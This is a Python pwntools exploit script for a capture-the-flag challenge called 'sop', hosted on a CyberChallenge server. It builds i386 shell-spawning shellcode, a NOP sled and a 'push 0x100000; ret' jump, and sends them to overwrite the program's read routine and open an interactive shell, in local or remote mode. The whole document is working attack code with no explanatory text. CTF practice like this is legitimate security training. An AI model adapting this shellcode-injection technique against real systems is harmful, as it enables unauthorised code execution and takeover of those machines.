#!/usr/bin/env python3

from pwn import *

exe = ELF("./sop")
context.binary = exe

READ_NBYTES = 266


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            gdb.attach(r)
    else:
        r = remote("sop.challs.cyberchallenge.it", 9247)

    return r


def main():
    r = conn()

    # 'read_stdio' situated at 0x100100, so we have to overwrite the first instructions

    shell  = asm(shellcraft.i386.sh())      # Length == 44
    NOPs   = b'\x90' * 212
    ret    = asm('push 0x100000; ret;')     # Buffer starts at 0x100000

    r.sendline(shell + NOPs + ret)
    r.interactive()


if __name__ == "__main__":
    main()
